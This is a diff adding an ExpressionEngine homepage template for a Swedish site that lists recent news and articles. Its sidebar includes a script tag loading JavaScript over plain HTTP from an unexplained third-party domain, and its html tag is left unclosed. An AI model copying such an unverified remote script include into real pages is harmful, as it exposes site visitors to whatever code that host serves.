@@ -1,0 +1,83 @@
+{exp:fbc:prepare_page}
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"
+
+
+{embed="embeds/html_header" my_page_title="Hem"}
+
+<body>
+
+<div id="home" class="active"></div>
+
+{lv_snippets_topnav}
+{lv_snippets_mainnav}
+{lv_modals_contact}
+{lv_modals_login}
+
+
+
+
+<div class="container hidden-phone" style="margin-bottom:20px;">
+	<div class="row">
+		<div class="span12">
+			<img src="/assets/images/site_images/1170.png" />
+		</div>
+	</div>
+</div>
+<div class="container white">
+	<div class="row">
+		<div class="span5">
+			<div class="page-header">
+				<h2>Gammalt Nytt:</h2>
+			</div>
+			{exp:channel:entries channel="news" disable="{lv_shortcut_disable_all}" sticky="no" dynamic="no" limit="2"}
+			<div class="padded rounded_all" style="margin-bottom:25px;">
+				<div class="well pull-right" style="padding:5px; margin-left:10px;">
+					{if avatar}
+						<img src="{avatar_url}" width="50px" height="50px" alt="{author}">
+					{/if}
+				</div>
+				<H3><a href='{url_title_path='news/post'}'>{title}</a></H3>
+				{if news_excerpt==""}
+					{exp:eehive_hacksaw words="150" append="..."}{news_entry}{/exp:eehive_hacksaw}
+				{/if}
+				{if news_excerpt!=""}
+					{news_excerpt}
+				{/if}
+
+			</div>
+			{/exp:channel:entries}
+		</div>
+		<div class="span5">
+			<div class="page-header">
+				<h2>Artiklar:</h2>
+			</div>
+			{exp:channel:entries channel="articles" disable="{lv_shortcut_disable_all}" sticky="no" dynamic="no" limit="2"}
+			<div class="padded rounded_all" style="margin-bottom:25px;">
+				<div class="well pull-right" style="padding:5px; margin-left:10px;">
+					{if avatar}
+						<img src="{avatar_url}" width="50px" height="50px" alt="{author}">
+					{/if}
+				</div>
+				<H3><a href='{url_title_path='articles/post'}'>{title}</a></H3>
+				{if article_excerpt==""}
+					{exp:eehive_hacksaw words="150" append="..."}{article_entry}{/exp:eehive_hacksaw}
+				{/if}
+				{if article_excerpt!=""}
+					{article_excerpt}
+				{/if}
+			</div>
+			{/exp:channel:entries}
+		</div>
+		<div class="span2 hidden-phone ">
+			<div class="padded rounded_all pull-right" style="margin-top:100px; padding:3px;">
+				<SCRIPT type="text/javascript" LANGUAGE="javascript" src="http://www.qksz.net/1e-lkre"> </SCRIPT>
+			</div>
+		</div>
+	</div>
+{lv_snippets_footer}
+</div>
+{lv_snippets_ad-banner}
+</body>
+</html>	
